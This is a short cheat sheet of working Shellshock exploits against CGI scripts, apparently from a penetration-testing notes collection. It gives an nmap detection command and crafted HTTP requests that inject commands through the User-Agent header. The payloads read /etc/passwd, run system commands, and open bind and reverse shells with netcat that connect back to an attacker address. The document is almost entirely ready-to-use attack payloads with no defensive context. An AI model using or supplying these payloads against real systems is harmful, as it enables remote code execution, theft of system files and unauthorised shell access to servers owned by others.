# shellshock

1. Find a vulnerable cgi-bin file to exec code shell
## nmap discovery shellshock
```bash
nmap -sV [IP] --script=http-shellshock --script-args "http-shellshock.uri=/[vulnerable.cgi]"
```

```http
HEAD /cgi-bin/status HTTP/1.1
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
Host: vulnerable
Connection: close
```

```http
HEAD /cgi-bin/status HTTP/1.1
User-Agent: () { :; }; echo $(</etc/passwd)
Host: vulnerable
Connection: close
```

``` bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo $(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable-server 80
```

```bash
User-Agent: () { :;}; /bin/bash -c 'echo aaaa; uname -a; echo zzzz;
```


#### Bind Shell
```bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 1246 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
```

#### Reverse Shell
```bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc [IP] 1246 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc [vulnerable-site] 80
```

```bash
nc -nvl -p 1246 
```

```bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo $(</etc/passwd)\r\nHost: ptl-07721499-eb55f252.libcurl.so\r\nConnection: close\r\n\r\n" | nc ptl-07721499-eb55f252.libcurl.so 
```